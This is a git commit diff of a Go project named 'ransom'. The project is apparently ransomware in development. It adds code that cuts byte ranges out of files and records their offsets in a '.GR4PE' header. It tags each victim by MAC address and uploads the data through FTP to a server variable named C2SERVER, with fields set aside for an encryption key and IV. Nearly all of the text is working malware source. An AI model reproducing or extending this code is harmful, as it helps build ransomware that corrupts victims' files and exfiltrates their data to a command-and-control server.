c0c1e08ff5e272b1a04b9779e0808956c1b3d261
dpp0900 <_dpp@kakao.com>
2023-10-11 11:01:23 +0900

    change Header

---
+++ go.mod
@@ -0,0 +1,9 @@
+module ransom
+
+go 1.20
+
+require (
+	github.com/hashicorp/errwrap v1.1.0 // indirect
+	github.com/hashicorp/go-multierror v1.1.1 // indirect
+	github.com/jlaffaye/ftp v0.2.0 // indirect
+)
--- main.go
+++ main.go
@@ -3,18 +3,31 @@ package main
 import (
 	"fmt"
 	"io"
+	"net"
 	"os"
 	"strconv"
 	"strings"
+
+	"github.com/jlaffaye/ftp"
 )
 
 type Header struct {
 	signiture []byte //.GR4PE
-	idx       []byte //IDXn.0xFFFFFFFFFFFF
+	filename  []byte //nm.FILENAME
+	Data      []Data //IDXn.0xFFFFFFFFFFFF
 }
 
-type deletedData struct {
-	idx  uint64 //IDXn.0xFFFFFFFFFFFF
+type uploadData struct {
+	signiture []byte //.GR4PE
+	filename  []byte //nm.FILENAME
+	mac       []byte //MAC.0xFFFFFFFFFFFF
+	Data      []Data //IDXn.0xFFFFFFFFFFFF
+	iv        []byte //iv
+	key       []byte //key
+}
+
+type Data struct {
+	idx  []byte //IDXn.0xFFFFFFFFFFFF
 	data []byte //data
 }
 
@@ -23,12 +36,16 @@ func check(e error) {
 		panic(e)
 	}
 }
+
 func readByte(filename string, offset int64, length int64) ([]byte, error) {
 	file, err := os.Open(filename)
 	check(err)
 	defer file.Close()
 	fileInfo, err := file.Stat()
 	check(err)
+	if length == -1 {
+		length = fileInfo.Size() - offset
+	}
 	if offset+length > fileInfo.Size() {
 		return nil, fmt.Errorf("offset+length > fileInfo.Size()")
 	}
@@ -48,6 +65,7 @@ func readNwriteBuf(wfile *os.File, rfile *os.File, buf []byte) {
 }
 
 func removeByte(filename string, offset int64, length int64) (string, error) {
+	BUFER_SIZE := int64(4096)
 	ret, err := readByte(filename, offset, length)
 	check(err)
 	rfile, err := os.Open(filename)
@@ -58,59 +76,131 @@ func removeByte(filename string, offset int64, length int64) (string, error) {
 	check(err)
 	defer rfile.Close()
 	defer wfile.Close()
-	for i := int64(0); i < offset/4096; i++ {
-		buf := make([]byte, 4096)
+	for i := int64(0); i < offset/BUFER_SIZE; i++ {
+		buf := make([]byte, BUFER_SIZE)
 		readNwriteBuf(wfile, rfile, buf)
 	}
-	buf := make([]byte, offset%4096)
+	buf := make([]byte, offset%BUFER_SIZE)
 	readNwriteBuf(wfile, rfile, buf)
 	_, err = rfile.Seek(length, 1)
 	check(err)
-	buf = make([]byte, 4096-(offset%4096)-length)
+	buf = make([]byte, BUFER_SIZE-(offset%BUFER_SIZE)-length)
 	readNwriteBuf(wfile, rfile, buf)
-	for i := int64(0); i < (fileInfo.Size()-(offset+length))/4096; i++ {
-		buf := make([]byte, 4096)
+	for i := int64(0); i < (fileInfo.Size()-(offset+length))/BUFER_SIZE; i++ {
+		buf := make([]byte, BUFER_SIZE)
 		readNwriteBuf(wfile, rfile, buf)
 	}
-	buf = make([]byte, (fileInfo.Size()-(offset+length))%4096)
+	buf = make([]byte, (fileInfo.Size()-(offset+length))%BUFER_SIZE)
 	readNwriteBuf(wfile, rfile, buf)
 	return string(ret), nil
 }
 
-func genHeader(deletedData []deletedData) []byte {
-	var idx []byte
+// data to string
+func idxToString(idx []uint64) string {
+	var data []byte
 	var cnt int
-	for _, v := range deletedData {
-		idx = append(idx, []byte(
+	for _, v := range idx {
+		data = append(data, []byte(
 			"IDX"+strconv.Itoa(cnt)+string(
 				[]byte(".0x"+
-					strings.Repeat("0", (12-len(strconv.FormatUint(v.idx, 16))))+
-					strconv.FormatUint(v.idx, 16))))...,
+					strings.Repeat("0", (12-len(strconv.FormatUint(v, 16))))+
+					strconv.FormatUint(v, 16))))...,
 		)
 		cnt++
 	}
-	return append([]byte(".GR4PE"), idx...)
+	return string(data)
+}
+
+func genUploadHeader(filename []byte, deletedData []Data) uploadData {
+	return uploadData{
+		[]byte(".GR4PE"),
+		filename,
+		append(
+			[]byte("MAC."),
+			[]byte(strings.ReplaceAll(getMacAddr(), ":", ""))...,
+		),
+		deletedData,
+		[]byte(""),
+		[]byte(""),
+	}
+}
+
+// func _genUploadHeader(deletedData []Data, filename []byte, macAddr []byte, key []byte) uploadData {
+// 	var idx []byte
+// 	var cnt int
+// 	for _, v := range deletedData {
+// 		idx = append(idx, []byte(
+// 			"IDX"+strconv.Itoa(cnt)+string(
+// 				[]byte(".0x"+
+// 					strings.Repeat("0", (12-len(strconv.FormatUint(v.idx, 16))))+
+// 					strconv.FormatUint(v.idx, 16))))...,
+// 		)
+// 		cnt++
+// 	}
+// 	return uploadData{[]byte(".GR4PE"), filename, macAddr, 0, idx, []byte(""), key}
+// }
+
+func getMacAddr() string {
+	interfaces, err := net.Interfaces()
+	check(err)
+	for _, inter := range interfaces {
+		if inter.Name == "eth0" {
+			return inter.HardwareAddr.String()
+		} else if inter.Name == "en0" {
+			return inter.HardwareAddr.String()
+		} else if inter.Name == "en1" {
+			return inter.HardwareAddr.String()
+		} else if inter.Name == "wlan0" {
+			return inter.HardwareAddr.String()
+		} else if inter.Name == "wlp3s0" {
+			return inter.HardwareAddr.String()
+		} else if inter.Name == "wlan1" {
+			return inter.HardwareAddr.String()
+		}
+	}
+	return ""
+}
+
+func ftpUpload(filename string, data []byte) (int, error) {
+	C2SERVER := "localhost:9021"
+	USERNAME := "anonymous"
+	PASSWORD := "anonymous"
+
+	uploader, err := ftp.Dial(C2SERVER)
+	check(err)
+	err = uploader.Login(USERNAME, PASSWORD)
+	check(err)
+	uid := strings.Replace(getMacAddr(), ":", "", -1)
+	err = uploader.MakeDir(uid)
+	check(err)
+	err = uploader.ChangeDir(uid)
+	check(err)
+	err = uploader.Stor(filename, strings.NewReader(string(data)))
+	check(err)
+	return 1, nil
 }
 
 func main() {
-	inputFileName := "tmpfile/in/test"
-	buf, err := removeByte(inputFileName, 40, 10)
-	check(err)
-	fmt.Println(buf)
-	/*
-		fmt.Print(genHeader([]deletedData{
+	//inputFileName := "tmpfile/in/test"
+	//buf, err := removeByte(inputFileName, 40, 10)
+	//check(err)
+	//fmt.Println(buf)
+	fmt.Print(getMacAddr())
+	fmt.Print(idxToString([]uint64{1, 2, 465789}))
+	fmt.Print(genUploadHeader(
+		[]byte("test"),
+		[]Data{
 			{
-				idx:  0x000000000100,
-				data: buf,
+				idx:  []byte("IDX.0x000000000100"),
+				data: []byte("test1"),
 			},
 			{
-				idx:  0x000000000001,
+				idx:  []byte("IDX.0x000000000001"),
 				data: []byte("test2"),
 			},
 			{
-				idx:  0x000000000002,
+				idx:  []byte("IDX.0x000000000002"),
 				data: []byte("test3"),
 			},
 		}))
-	*/
 }
